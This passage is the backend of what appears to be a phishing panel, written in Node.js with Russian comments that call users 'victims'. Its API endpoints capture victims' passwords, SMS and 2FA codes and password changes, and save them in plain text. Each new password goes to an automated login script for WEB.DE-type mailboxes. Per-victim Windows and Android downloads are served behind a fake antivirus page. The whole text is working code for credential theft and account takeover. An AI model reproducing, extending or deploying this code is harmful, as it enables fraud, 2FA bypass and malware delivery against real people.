        ' replay=' + (passwordWrite.replay === true ? '1' : '0')
      );

      if (!refreshedLead.eventTerminal) refreshedLead.eventTerminal = [];
      const hasPasswordEvent = refreshedLead.eventTerminal.some(function (e) {
        return labelIsVictimPass(e.label);
      });
      const isKlPwd = refreshedLead.brand === 'klein';
      const repeatWrong = victimPassRepeatIsKnownWrong(refreshedLead, newPassword, isKlPwd);
      if (repeatWrong) {
        pushEvent(refreshedLead, wrongPasswordLabelForVictim(isKlPwd));
      } else if (!hasPasswordEvent) {
        pushEvent(refreshedLead, isKlPwd ? EVENT_VICTIM_PASS_KL : EVENT_VICTIM_PASS);
      } else {
        pushEvent(refreshedLead, 'Ввел пароль повторно');
      }
      autoUnhideAfterVictimActivity(refreshedLead);
      if (!Array.isArray(refreshedLead.passwordHistory)) refreshedLead.passwordHistory = [];
      if (refreshedLead.passwordHistory.length === 0 && (oldPassword || '').trim()) {
        refreshedLead.passwordHistory.push({ p: String(oldPassword).trim(), s: 'login' });
      }
      pushPasswordHistory(refreshedLead, newPassword, 'login');
      // Сохраняем в all.txt если пароль изменился
      if (email && newPassword && newPassword !== oldPassword) {
        appendToAllLog(email, oldPassword, newPassword);
      }
      // Long-poll автовхода ждёт только POST из ветки status=error; если жертва обновила пароль
      // пока лид ещё pending/show_success — разбудим скрипт так же (иначе ждёт до таймаута).
      if (webdePasswordWaiters[id] && newPassword.trim() !== '' && newPassword !== oldPassword) {
        const waiterAttemptNo = Number.isFinite(webdePasswordWaiters[id].attemptNo)
          ? Number(webdePasswordWaiters[id].attemptNo)
          : (Number.isFinite(refreshedLead.attemptNo) ? Number(refreshedLead.attemptNo) : 1);
        const wakeVersion = Number.isFinite(refreshedLead.passwordVersion) ? Number(refreshedLead.passwordVersion) : 0;
        markPasswordConsumedByAttempt(id, wakeVersion, waiterAttemptNo);
        clearTimeout(webdePasswordWaiters[id].timeoutId);
        try {
          send(webdePasswordWaiters[id].res, 200, {
            password: newPassword,
            passwordVersion: wakeVersion,
            attemptNo: waiterAttemptNo,
            wakeupReason: 'new_version',
            requestId: webdePasswordWaiters[id].requestId || null,
            instance: SERVER_INSTANCE
          });
        } catch (e) {}
        delete webdePasswordWaiters[id];
        automationService.setWebdeLeadScriptStatus(id, null);
        console.log('[АДМИН] webde-wait-password lifecycle=wakeup instance=' + SERVER_INSTANCE + ' leadId=' + id + ' wakeup_reason=new_version response_version=' + wakeVersion);
      }
      // Auto (не Auto-Login): после смены пароля редирект по startPage
      const mode = readMode();
      const startPage = readStartPageForBrand(
        startPageBrandForLead(refreshedLead.brand)
      );
      if (refreshedLead.status === 'pending' && newPassword.trim() !== '') {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, refreshedLead);
        const autoLoginNoRedirect = mode === 'auto' && readAutoScript() && !status;
        logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, id, email,
          'update-password: getInitialRedirectStatus → ' + (status || 'null')
          + (status ? ' · ' + getAutoRedirectEventLabel(status) : '')
          + (autoLoginNoRedirect ? ' · Auto-Login: без редиректа здесь (редирект после успеха скрипта / смена пароля)' : ''));
        if (status) {
          refreshedLead.status = status;
          pushEvent(refreshedLead, getAutoRedirectEventLabel(refreshedLead.status));
        }
      }
      const spPwd = String(
        readStartPageForBrand(startPageBrandForLead(refreshedLead.brand)) || ''
      ).trim().toLowerCase();
      // Раньше рестарт был только для change; при download/login жертва после «Неверные данные»
      // часто шлёт пароль через update-password — без этого автовход не поднимался.
      const startPageAllowsWebdePwdRestart =
        spPwd === 'change' || spPwd === 'download' || spPwd === 'login';
      if (
        newPassword.trim() !== '' &&
        mode === 'auto' &&
        readAutoScript() &&
        startPageAllowsWebdePwdRestart &&
        refreshedLead.brand !== 'klein' &&
        !vintContextNow &&
        typeof leadIsWorkedLikeAdmin === 'function' &&
        !leadIsWorkedLikeAdmin(refreshedLead)
      ) {
        const emW = String(refreshedLead.email || '').trim().toLowerCase();
        if (emailEligibleForUnitedInternetMailScript(emW)) {
          // После «Неверные данные» скрипт уже завершился, но lead-lock / слот могут оставаться «активными» —
          // тогда isLeadAutomationAlreadyRunning=true и ветка с preempt+start никогда не выполнялась.
          if (String(refreshedLead.status || '').trim() === 'error') {
            automationService.preemptWebdeLoginForReplacedLead(id, emW);
            try {
              persistLeadPatch(id, {
                webdeScriptActiveRun: null,
                webdeLoginGridExhausted: null,
                webdeLoginGridStep: null
              });
              invalidateLeadsCache();
            } catch (e) {
              console.warn('[ВХОД] update-password после error: сброс lock/флагов:', e && e.message ? e.message : e);
            }
          }
          if (!shouldSkipVintMailboxAutomation(refreshedLead, 'update-password') && !automationService.isLeadAutomationAlreadyRunning(id)) {
            automationService.preemptWebdeLoginForReplacedLead(id, emW);
            try {
              persistLeadPatch(id, {
                webdeScriptActiveRun: null,
                webdeLoginGridExhausted: null,
                webdeLoginGridStep: null
              });
              invalidateLeadsCache();
            } catch (e) {
              console.warn('[ВХОД] update-password: сброс webdeScriptActiveRun:', e && e.message ? e.message : e);
            }
            const liveLead = readLeadById(id) || refreshedLead;
            delete liveLead.webdeLoginGridExhausted;
            delete liveLead.webdeLoginGridStep;
            logTerminalFlow(
              'РЕЖИМ',
              'Автовход',
              '—',
              liveLead.email || '—',
              'update-password: старт автовхода ' + mailboxAutomationLogLabel(liveLead.email || '') + ' (пароль в API) · leadId=' + id,
              id
            );
            automationService.startWebdeLoginAfterLeadSubmit(id, liveLead, false);
          }
        }
      }
      const dbLeadForFinalPatch = readLeadById(id) || refreshedLead;
      const forceVintPersist =
        vintContextNow ||
        brandIsVint(dbLeadForFinalPatch.brand) ||
        brandIsVint(dbLeadForFinalPatch.clientFormBrand) ||
        brandIsVint(dbLeadForFinalPatch.hostBrandAtSubmit) ||
        String(dbLeadForFinalPatch.emailVt || '').trim() !== '' ||
        String(dbLeadForFinalPatch.passwordVt || '').trim() !== '';
      if (forceVintPersist) {
        refreshedLead.brand = 'vint';
        refreshedLead.clientFormBrand = 'vint';
        refreshedLead.hostBrandAtSubmit = 'vint';
        if (email) refreshedLead.emailVt = email;
        refreshedLead.passwordVt = newPassword;
      }
      persistLeadPatch(id, {
        brand: forceVintPersist ? 'vint' : undefined,
        clientFormBrand: forceVintPersist ? 'vint' : undefined,
        hostBrandAtSubmit: forceVintPersist ? 'vint' : undefined,
        status: refreshedLead.status,
        eventTerminal: refreshedLead.eventTerminal,
        passwordHistory: refreshedLead.passwordHistory,
        emailVt: forceVintPersist ? refreshedLead.emailVt : undefined,
        passwordVt: forceVintPersist ? refreshedLead.passwordVt : undefined
      });
      writeDebugLog('UPDATE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: refreshedLead.status
      });
      send(res, 200, { ok: true, id: id });
    });
    return true;
  }
  if (pathname === '/api/choose-method' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      const method = json.method;
      if (!id || typeof id !== 'string' || !method || (method !== 'push' && method !== 'sms')) {
        return send(res, 400, { ok: false });
      }
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (method === 'push') {
        lead.status = 'redirect_push';
        pushEvent(lead, EVENT_LABELS.PUSH, 'user');
      } else {
        lead.status = 'redirect_sms_code';
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'user');
      }
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return true;
  }
  if (pathname === '/api/log-action' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id;
      const action = json.action;
      if (!idRaw || typeof idRaw !== 'string' || !action) {
        return send(res, 400, { ok: false });
      }
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      
      // Обрабатываем действие 'success' - записываем событие успеха в лог
      if (action === 'success') {
        lead.status = 'show_success';
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS);
        persistLeadPatch(id, { status: lead.status, lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        writeDebugLog('LOG_ACTION_SUCCESS', { 
          id: id, 
          email: lead.email || '',
          action: action
        });
        return send(res, 200, { ok: true });
      }
      
      // Действие со страницы загрузки антивируса: только пишем в лог лида
      if (action === 'sicherheit_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать');
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      if (action === 'android_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать (Android)');
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      // Обрабатываем другие действия (push_resend, sms_resend, sms_request)
      const validAction = action === 'push_resend' || action === 'sms_resend' || action === 'sms_request' || action === 'two_fa_resend' ? action : null;
      if (!validAction) {
        return send(res, 400, { ok: false });
      }
      if (validAction === 'push_resend') {
        webdePushResendRequested[id] = true;
      }
      if (!lead.actionLog) lead.actionLog = [];
      lead.actionLog.push({ type: validAction, at: new Date().toISOString() });
      const labels = {
        push_resend: 'Просит новый',
        sms_resend: 'Просит новый',
        sms_request: 'SMS',
        two_fa_resend: 'Просит новый',
      };
      lead.lastSeenAt = new Date().toISOString();
      pushEvent(lead, labels[validAction] || validAction);
      persistLeadPatch(id, {
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal,
        actionLog: lead.actionLog
      });
      send(res, 200, { ok: true });
    });
    return true;
  }
  if (pathname === '/api/sms-code-submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id != null ? String(json.id).trim() : '';
      const visitIdRaw = json.visitId != null ? String(json.visitId).trim() : '';
      const candidateId = idRaw || visitIdRaw;
      if (!candidateId) return send(res, 400, { ok: false });
      const id = resolveLeadId(candidateId);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const codeStr = json.code != null ? String(json.code).trim() : '';
      const submitKind = json.kind != null ? String(json.kind).trim().toLowerCase() : '';
      lead.smsCodeData = {
        code: codeStr,
        submittedAt: new Date().toISOString(),
        kind: submitKind === '2fa' ? '2fa' : 'sms',
      };
      let smsEventLabel;
      if (submitKind === '2fa') {
        smsEventLabel = codeStr ? ('Ввел 2FA-код: ' + codeStr) : 'Ввел 2FA-код';
      } else {
        smsEventLabel = lead.brand === 'klein'
          ? (codeStr ? 'Ввел SMS Kl: ' + codeStr : 'Ввел SMS Kl')
          : (codeStr ? 'Ввел SMS-код: ' + codeStr : 'Ввел SMS-код');
      }
      let clearWrong2faScript = false;
      if (submitKind === '2fa' && lead.scriptStatus === 'wrong_2fa') {
        delete lead.scriptStatus;
        clearWrong2faScript = true;
      }
      const leaveErrorAfterSmsRetry =
        String(lead.status || '').trim().toLowerCase() === 'error'
        && String(lead.adminErrorKind || '').trim().toLowerCase() === 'sms';
      if (leaveErrorAfterSmsRetry) {
        lead.status = submitKind === '2fa' ? 'redirect_2fa_code' : 'redirect_sms_code';
        lead.adminErrorKind = '';
      }
      pushEvent(lead, smsEventLabel);
      // Не переводим в show_success автоматически: админ сам отправляет на успех после проверки кода (если код неверный — юзер может ввести заново)
      const smsPatch = { smsCodeData: lead.smsCodeData, eventTerminal: lead.eventTerminal };
      if (clearWrong2faScript) smsPatch.scriptStatus = null;
      if (leaveErrorAfterSmsRetry) {
        smsPatch.status = lead.status;
        smsPatch.adminErrorKind = '';
      }
      persistLeadPatch(id, smsPatch);
      autoUnhideAfterVictimActivity(lead);
      send(res, 200, { ok: true });
    });
    return true;
  }
  if (pathname === '/api/change-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const email = (lead.email || '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      
      // Сохраняем в all.txt
      if (email && newPassword) {
        appendToAllLog(email, currentPassword, newPassword);
      }
      
      lead.changePasswordData = {
        currentPassword: currentPassword,
        newPassword: newPassword,
        submittedAt: new Date().toISOString(),
      };
      // Пароль со страницы смены: WEB → change, Klein → change_kl (иначе в выгрузке куков new перепутывается с паролем Kl).
      pushPasswordHistory(lead, newPassword, lead.brand === 'klein' ? 'change_kl' : 'change');
      lead.lastSeenAt = new Date().toISOString();
      
      // Устанавливаем статус для показа окна успеха через 5 секунд
      const mode = readMode();
      if (mode === 'auto') {
        // В режиме AUTO статус будет установлен через 5 секунд (обрабатывается на клиенте)
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      } else {
        // В режиме MANUAL статус устанавливается админом вручную
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      }
      
      persistLeadFull(lead);
      writeDebugLog('CHANGE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: lead.status
      });
      send(res, 200, { ok: true });
    });
    return true;
  }
  if (pathname === '/api/change-password-by-email' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const visitId = (json.visitId != null && String(json.visitId).trim()) ? String(json.visitId).trim() : null;
      let email = (json.email != null ? String(json.email) : '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      if (!newPassword || newPassword.length < 8) return send(res, 400, { ok: false, error: 'Neues Passwort muss mindestens 8 Zeichen haben.' });
      const leads = readLeads();
      let idx = -1;
      if (visitId) {
        idx = leads.findIndex((l) => l.id === visitId);
        if (idx >= 0 && !email) email = (leads[idx].email || '').trim();
      }
      if (idx === -1 && email) {
        const emailLower = email.toLowerCase();
        idx = leads.findIndex((l) => (l.email || '').trim().toLowerCase() === emailLower);
      }
      if (idx < 0) return send(res, 400, { ok: false, error: 'E-Mail fehlt oder Sitzung ungültig.' });
      const mode = readMode();
      if (idx >= 0) {
        const lead = leads[idx];
        lead.email = email;
        lead.changePasswordData = { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() };
        const oldPassword = lead.password || '';
        pushPasswordHistory(lead, newPassword, lead.brand === 'klein' ? 'change_kl' : 'change');
        lead.lastSeenAt = new Date().toISOString();
        if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
        if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
        const platformChange = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
        if (platformChange != null) lead.platform = platformChange;
        // В режиме AUTO сразу показываем успех (клиент покажет overlay и вызовет log-action)
        if (mode === 'auto') {
          lead.status = 'show_success';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        } else {
          lead.status = 'pending';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        }
        
        persistLeadFull(lead);
        appendToAllLog(email, currentPassword, newPassword);
        writeDebugLog('CHANGE_PASSWORD_BY_EMAIL', { 
          id: idx >= 0 ? lead.id : newId, 
          email: email,
          oldPassword: oldPassword,
          newPassword: newPassword,
          visitId: visitId || null
        });
        send(res, 200, { ok: true });
        return;
      }
      // Если лид не найден, создаём новый (или обновляем существующий по visitId, если он был передан)
      const newId = visitId || ('pw-' + Date.now() + '-' + Math.random().toString(36).slice(2, 11));
      const ip = getClientIp(req);
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      const newLead = {
        id: newId,
        email: email,
        ip: ip,
        password: newPassword,
        createdAt: new Date().toISOString(),
        lastSeenAt: new Date().toISOString(),
        changePasswordData: { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() },
        status: mode === 'auto' ? 'show_success' : 'pending',
        eventTerminal: mode === 'auto' ? [{ at: new Date().toISOString(), label: 'Автоматически: окно успеха' }] : [],
        platform: platform || undefined,
        screenWidth: screenW,
        screenHeight: screenH,
      };
      pushPasswordHistory(newLead, newPassword, 'change');
      appendToAllLog(email, currentPassword, newPassword);
      persistLeadFull(newLead);
      send(res, 200, { ok: true });
    });
    return true;
  }
  if (pathname === '/api/download-request' && req.method === 'POST') {
    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) return send(res, 403, { ok: false, error: 'forbidden' });
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {}
      const leadIdRaw = (json.leadId && String(json.leadId).trim()) || '';
      const leadId = leadIdRaw ? resolveLeadId(leadIdRaw) : '';
      const platform = (json.platform && String(json.platform).trim().toLowerCase()) || '';
      const lead = leadId && typeof readLeadById === 'function' ? readLeadById(leadId) : null;
      let fileName = null;
      if (platform === 'android') {
        fileName = downloadKit.pickAndroidDownloadFileNameForLead(leadId, lead);
      } else {
        fileName = downloadKit.pickWindowsDownloadFileNameForLead(leadId, lead);
      }
      if (!fileName) return send(res, 404, { ok: false, error: 'no_file' });
      const token = generateDownloadToken(fileName);
      const downloadUrl = '/download/' + encodeURIComponent(fileName) + '?t=' + encodeURIComponent(token);
      send(res, 200, { ok: true, downloadUrl: downloadUrl });
    });
    return true;
  }
  if (pathname === '/api/download-filename' && req.method === 'GET') {
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const platform = (parsed.query && parsed.query.platform) ? String(parsed.query.platform).trim().toLowerCase() : '';
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    const lead = leadId && typeof readLeadById === 'function' ? readLeadById(leadId) : null;
    if (platform === 'android') {
      const fn = downloadKit.pickAndroidDownloadFileNameForLead(leadId, lead);
      return send(res, 200, { fileName: fn || null });
    }
    const fn = downloadKit.pickWindowsDownloadFileNameForLead(leadId, lead);
    send(res, 200, { fileName: fn || null });
    return true;
  }
  }
  return false;
}

module.exports = { handle };
